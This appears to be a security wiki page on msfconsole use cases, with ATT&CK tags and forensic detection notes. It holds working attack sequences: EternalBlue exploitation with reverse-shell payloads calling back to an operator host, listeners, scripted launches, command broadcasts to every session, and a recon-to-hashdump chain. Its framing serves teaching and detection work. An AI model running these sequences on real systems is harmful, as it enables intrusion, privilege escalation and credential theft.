# Metasploit — msfconsole — Hands-On Use Cases

Every scenario below is a variation on the same dispatcher-driven command loop documented in `01 - Overview.md`'s How It Works section — what changes is which module gets loaded, what state it reads/writes (local datastore, global datastore, the database), and whether the sequence is typed live or driven from a resource script. MITRE ATT&CK ID(s) are tagged per scenario; several are genuinely **console/tooling mechanics with no ATT&CK mapping of their own** — stated explicitly rather than forcing a technique ID where none fits.

## Contents
- [Baseline Module Workflow](#baseline-module-workflow)
- [Interrogating a Module Before Running It](#interrogating-a-module-before-running-it)
- [Global vs. Per-Module Options](#global-vs-per-module-options)
- [Standing Up a multi/handler Listener](#standing-up-a-multihandler-listener)
- [Running Multiple Handlers as Background Jobs](#running-multiple-handlers-as-background-jobs)
- [Interacting With, Upgrading, and Broadcasting Across Sessions](#interacting-with-upgrading-and-broadcasting-across-sessions)
- [Building a Workspace and Scanning Straight Into the Database](#building-a-workspace-and-scanning-straight-into-the-database)
- [Reviewing and Pivoting Off Collected Data](#reviewing-and-pivoting-off-collected-data)
- [Automating a Repeatable Attack Chain With a Resource Script](#automating-a-repeatable-attack-chain-with-a-resource-script)
- [Unattended, Fully Scripted Engagement Launch](#unattended-fully-scripted-engagement-launch)
- [Loading a Plugin to Extend the Console](#loading-a-plugin-to-extend-the-console)
- [Logging Console Output for Engagement Documentation](#logging-console-output-for-engagement-documentation)
- [Fleet-Wide Targeting and Cross-Session Broadcast](#fleet-wide-targeting-and-cross-session-broadcast)
- [Chained Workflow: Recon to Shell to Post-Exploitation](#chained-workflow-recon-to-shell-to-post-exploitation)

---

## Baseline Module Workflow

**MITRE ATT&CK:** [T1210](https://attack.mitre.org/techniques/T1210/) (Exploitation of Remote Services) — for the `exploit` case specifically; an `auxiliary`/`post` module in the same slot would carry whatever technique that module's own action represents instead.

The core loop every other use case in this note is a variation of.

```
msf6 > search type:exploit eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.5
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.1
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

`search` filters by keyword or typed filter (`type:`, `cve:`, `platform:`, `rank:`, etc. — see `01 - Overview.md`); `use` loads the chosen module and changes the prompt to reflect it; `show options` lists what's required before `run`/`exploit` will proceed; `set` assigns values. `run` fires the module — for an `exploit` module that succeeds, the Framework opens a new session and assigns it a numeric ID, which every later use case in this note references.

## Interrogating a Module Before Running It

**MITRE ATT&CK:** None — this interrogates the *tool*, not a target. No network traffic or target-side action occurs.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > info

msf6 exploit(windows/smb/ms17_010_eternalblue) > info -d
# opens the module's full documentation as rendered Markdown in a browser

msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
msf6 exploit(windows/smb/ms17_010_eternalblue) > show targets
msf6 exploit(windows/smb/ms17_010_eternalblue) > show advanced
msf6 exploit(windows/smb/ms17_010_eternalblue) > show missing
# 'missing' surfaces exactly which required options are still unset —
# the fastest way to find out why `run` is about to fail
```
`info` (and `-d`'s browser-rendered variant) is how an operator confirms a module's actual behavior, supported targets, and references (CVE/EDB/etc.) *before* committing to running it against a live target — reading `show options`/`show targets`/`show advanced` output is also how a blue-team analyst, with no offensive background, can reconstruct exactly what a given `use`/`set` sequence recovered from a history file was capable of.

## Global vs. Per-Module Options

**MITRE ATT&CK:** None — datastore management is console configuration, not an action against a target.

```
msf6 > setg LHOST 10.10.14.1
msf6 > setg LPORT 4444
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
# LHOST/LPORT are already populated from the global datastore — no need to re-set them
msf6 exploit(multi/handler) > back
msf6 > use exploit/windows/smb/ms17_010_eternalblue
# LHOST/LPORT are STILL populated here too — setg values persist across every module
# loaded afterward, in the same console session, until explicitly unset
msf6 exploit(windows/smb/ms17_010_eternalblue) > unset LHOST
msf6 exploit(windows/smb/ms17_010_eternalblue) > unsetg LPORT
msf6 exploit(windows/smb/ms17_010_eternalblue) > save
# writes the current datastore (including any remaining setg values) to
# ~/.msf4/config, auto-loaded on every future msfconsole launch
```
Operators running many modules against the same engagement set `LHOST`/`RHOSTS`/`SMBUser`/`SMBPass`-class values once with `setg` rather than retyping them per module — efficient for the operator, but also means a single `~/.msf4/config` or a `setg` line early in `~/.msf4/history` can retroactively explain option values that never appear again anywhere near the module they actually applied to (see `03 - Source Evidence.md`).

## Standing Up a multi/handler Listener

**MITRE ATT&CK:** [T1071.001](https://attack.mitre.org/techniques/T1071/001/) (Application Layer Protocol: Web Protocols — `reverse_http`/`reverse_https` only) · [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer — the stage1 pull, for staged payloads)

`multi/handler` is Metasploit's generic payload catcher — the console-side counterpart to a payload generated by `msfvenom` or delivered by any exploit module. It doesn't exploit anything itself; it just matches a configured `PAYLOAD` and waits.

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.1
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j -z
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 10.10.14.1:4444
```
`-j` runs the handler as a background job so the console stays free for other work; `-z` (exploit-specific — see `01 - Overview.md`'s `run`/`exploit` flag table) tells msfconsole **not** to automatically drop into an interactive session the instant the first callback lands, useful when catching several targets against the same listener. Once a target executes the matching `stage0` stub (delivered separately — by an exploit module, or a standalone file from `../msfvenom/`), the handler receives the callback and — for a staged payload — pulls down `stage1` automatically; for a stageless payload, the callback alone is the whole session. Payload generation itself is out of scope here — see `../msfvenom/02 - Hands-On Use Cases.md`; session mechanics once caught are covered in `../Meterpreter/01 - Overview.md`'s How It Works.

A `bind_tcp` payload inverts the direction: the target listens, and the handler *connects out* to it instead —

```
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOSTS 10.10.10.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j -z
```
— relevant when the target can't reach the operator outbound (aggressive egress filtering) but the operator can reach the target inbound.

## Running Multiple Handlers as Background Jobs

**MITRE ATT&CK:** Same as above — [T1071.001](https://attack.mitre.org/techniques/T1071/001/) / [T1105](https://attack.mitre.org/techniques/T1105/); this scenario is job-control tradecraft layered on the same technique, not a new one.

```
msf6 > jobs -l
Jobs
====
  Id  Name                                    Payload                        Payload opts
  --  ----                                    -------                        ------------
  0   Exploit: multi/handler                  windows/x64/meterpreter/reverse_tcp  lhost=10.10.14.1 lport=4444
  1   Exploit: multi/handler                  windows/x64/meterpreter/reverse_https lhost=10.10.14.1 lport=8443

msf6 > jobs -i 0 -v
msf6 > jobs -k 1
msf6 > jobs -K
```
Multiple `multi/handler` instances — different ports, different transports, different payload architectures — can run concurrently as separate jobs, which is how an operator covers several delivery vectors from one console (e.g. a `reverse_tcp` handler for a direct-egress path and a `reverse_https` handler for a proxy-aware fallback, running at the same time). `jobs -p <id>` (or `-P` for all) writes a persistence record to `~/.msf4/persist` so the same handler(s) automatically restart the next time `msfconsole` launches — a durable, disk-resident configuration artifact distinct from anything in `~/.msf4/history` (see `03 - Source Evidence.md`).

## Interacting With, Upgrading, and Broadcasting Across Sessions

**MITRE ATT&CK:** None at the session-management layer itself — tag whatever the session's *payload* represents (see `../Meterpreter/02 - Hands-On Use Cases.md` for post-exploitation technique mapping).

```
msf6 > sessions -l
msf6 > sessions -i 1
meterpreter > background
msf6 > sessions -u 2
# attempts to upgrade a plain command-shell session (id 2) to a full Meterpreter session

msf6 > sessions -c "whoami" -i 1
msf6 > sessions -C "getuid"
# -C runs a Meterpreter command; omitting -i broadcasts it to EVERY active session
```
`sessions -c`/`-C` without `-i` is the fleet-wide post-exploitation primitive: one command, run identically against every open session, rather than interacting with each one individually. This is the shape a ransomware-deployment or mass-exfiltration operator uses once they hold many simultaneous footholds.

## Building a Workspace and Scanning Straight Into the Database

**MITRE ATT&CK:** [T1046](https://attack.mitre.org/techniques/T1046/) (Network Service Discovery) · [T1595.002](https://attack.mitre.org/techniques/T1595/002/) (Active Scanning: Vulnerability Scanning, if NSE vuln scripts are passed through)

```
msf6 > workspace -a client-acme-2026
msf6 > workspace client-acme-2026
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.

msf6 > db_nmap -sV -O -p- 10.10.10.0/24
```
`db_nmap` runs a real `nmap` binary with whatever flags follow, then imports the resulting hosts, open ports, and service-version banners directly into the active **workspace** — no separate `db_import` step. Every engagement gets its own workspace so results from a different client/target scope don't bleed into `hosts`/`services`/`creds`/`loot` queries run later; forgetting to switch workspaces before scanning a new engagement is a common, forensically visible operator mistake (mixed-workspace data is a tell that the operator was working two engagements from the same console session).

## Reviewing and Pivoting Off Collected Data

**MITRE ATT&CK:** None new — this reviews/reuses data already gathered under whatever technique produced it (scanning, credential harvesting, etc.).

```
msf6 > hosts
msf6 > services -p 445 -u
msf6 > vulns
msf6 > creds
msf6 > loot

msf6 > services -p 445 -u -R
# -R feeds every matching host straight into RHOSTS on the currently loaded module —
# skips manually copy-pasting IP addresses from the services table

msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```
This is the operational payoff of scanning into the database rather than reading `db_nmap`'s console output and discarding it: `hosts`/`services`/`vulns`/`creds`/`loot` become a live, queryable ledger that later modules pull straight from via `-R`, rather than an operator re-deriving target lists by hand each time. `creds` in particular accumulates everything `hashdump`, `kiwi`, and any exploit/auxiliary module that reports successful authentication have recovered — a single command surfaces every credential harvested across the entire engagement to date.

## Automating a Repeatable Attack Chain With a Resource Script

**MITRE ATT&CK:** [T1059](https://attack.mitre.org/techniques/T1059/) (Command and Scripting Interpreter) — the resource script is itself a sequence of scripted commands executed by the console's interpreter.

```rc
# eternalblue-handler.rc
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.1
set LPORT 4444
exploit -j -z
```
```
msfconsole -r eternalblue-handler.rc
# or, from an already-running console:
msf6 > resource eternalblue-handler.rc
```
A resource script is a flat text file of console commands, executed exactly as if typed interactively — including Ruby control flow via embedded `<ruby>...</ruby>` blocks (e.g. `run_single("set RHOSTS #{framework.db.hosts.map(&:address).join(' ')}")` to pull live values out of the database mid-script). Operators write these to make a multi-step sequence — stand up a listener, configure a module, fire it — repeatable across engagements or across a large target list without re-typing it, and `makerc <file>` generates one directly from whatever's already in the current session's command history:

```
msf6 > makerc last-attack-chain.rc
[*] Saving last 12 commands to last-attack-chain.rc
```

## Unattended, Fully Scripted Engagement Launch

**MITRE ATT&CK:** Composite — same tags as whichever module(s) the script chains together; the launch mechanism itself is [T1059](https://attack.mitre.org/techniques/T1059/).

```bash
msfconsole -q -r setup.rc
# or, entirely inline with no .rc file on disk at all:
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.1; set LPORT 4444; exploit -j -z"
```
`-q` suppresses the startup banner, `-r` runs a resource script immediately, and `-x` runs an inline command string (semicolon-separated) — Rapid7's own documented replacement for the retired `msfcli` tool (see `01 - Overview.md`'s History). Both are how msfconsole gets invoked non-interactively from a wrapper script, a CI pipeline, or a larger orchestration tool without an operator ever seeing the interactive prompt. From a forensic angle, the entire operational intent of the run is visible in **one shell-history line** on the operator's box — see `03 - Source Evidence.md`.

## Loading a Plugin to Extend the Console

**MITRE ATT&CK:** None — a plugin extends the operator's own tooling; it doesn't act against a target by itself.

```
msf6 > load -l
# lists built-in plugins available under the framework's plugins/ directory
# and the user's own ~/.msf4/plugins/

msf6 > load pcap_log
msf6 > pcap_dir /home/operator/engagement-pcaps/
msf6 > pcap_start
```
Plugins add new top-level commands to the console. `pcap_log` is a good example of one with its own forensic footprint: once loaded and started, it writes a raw packet capture of session traffic to disk (`/tmp` by default unless redirected with `pcap_dir`) — a legitimate operator convenience for engagement documentation, but also a historical vulnerability vector in its own right (older Framework versions wrote these with predictable filenames in a world-writable directory, which `post/multi/escalate/metasploit_pcaplog` exploits for local privilege escalation on the operator's own box — worth knowing if investigating a compromised red-team workstation specifically). `load <plugin>` searches `~/.msf4/plugins/` first, then the Framework's own `plugins/` directory.

## Logging Console Output for Engagement Documentation

**MITRE ATT&CK:** None — this is operator-side logging hygiene, not a target-facing action. Its *absence*, however, is a deliberate operator choice worth noting when reconstructing what evidence should exist but doesn't.

```
msf6 > spool /home/operator/engagement-log.txt
msf6 > spool off

msf6 > setg ConsoleLogging true
msf6 > setg LogLevel 3
```
`spool <file>` mirrors all console I/O — everything typed and everything printed — to a file from that point forward; `-o`/`--output` at launch does the same from the very start of the session. `ConsoleLogging` (a global datastore boolean, distinct from `spool`) additionally writes a `console.log` under `~/.msf4/logs/`, and `LogLevel` (0–3; framework default is 0) controls the verbosity of the Framework's own `framework.log` in the same directory. None of this is on by default — an operator has to deliberately turn it on, which means its presence on a compromised operator box is itself informative (careful, log-keeping operator) and its absence is simply the default, not evidence of evasion.

## Fleet-Wide Targeting and Cross-Session Broadcast

**MITRE ATT&CK:** [T1046](https://attack.mitre.org/techniques/T1046/) (Network Service Discovery) · [T1059](https://attack.mitre.org/techniques/T1059/) (Command and Scripting Interpreter, for the broadcast execution)

```
msf6 > db_nmap -sV -p 445 10.10.10.0/24

msf6 > services -p 445 -u -R
msf6 auxiliary(scanner/smb/smb_ms17_010) > run
# RHOSTS now holds every host in the /24 with 445 open — one run against the whole range

msf6 > sessions -C "getsystem"
# once multiple sessions exist, broadcast a single post-exploitation command to all of them
```
This is the shape a real intrusion or an authorized mass-exploitation engagement takes at scale: scan a whole range into the database once, let `-R` populate `RHOSTS` for whatever module runs next, and use `sessions -c`/`-C` (no `-i`) to act on every resulting session identically rather than one host at a time. A burst of near-simultaneous exploitation attempts against many hosts in a tight window, all originating from one console/database session, is the msfconsole-level version of the same fleet-wide pattern documented for `psexec.py` in `../../Impacket/psexec/02 - Hands-On Use Cases.md`.

## Chained Workflow: Recon to Shell to Post-Exploitation

**MITRE ATT&CK:** [T1046](https://attack.mitre.org/techniques/T1046/) · [T1210](https://attack.mitre.org/techniques/T1210/) · [T1071.001](https://attack.mitre.org/techniques/T1071/001/)/[T1105](https://attack.mitre.org/techniques/T1105/) · [T1059](https://attack.mitre.org/techniques/T1059/) — the full canonical loop touches all of them in sequence.

```
msf6 > workspace -a acme-2026
msf6 > workspace acme-2026
msf6 > db_nmap -sV 10.10.10.0/24
msf6 > services -p 445 -u -R

msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.1
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -j -z

msf6 > sessions -l
msf6 > sessions -i 1
meterpreter > getsystem
meterpreter > hashdump
meterpreter > background

msf6 > creds
msf6 > loot
```
Recognizing this **chain** — not just any single command in isolation — is what separates a fast, high-confidence detection from a slow one: a `db_nmap`-shaped scan burst against a subnet, followed within minutes by a service-exploitation attempt against a host in that same subnet, followed by a new session and privilege-escalation/credential-dumping activity, all traceable to the same operator box via `~/.msf4/history` and the workspace database, is a textbook Metasploit-driven intrusion end to end. Post-exploitation depth (`getsystem`, `hashdump`, `kiwi`, `incognito`, and the rest) is covered fully in `../Meterpreter/02 - Hands-On Use Cases.md` — not re-derived here.
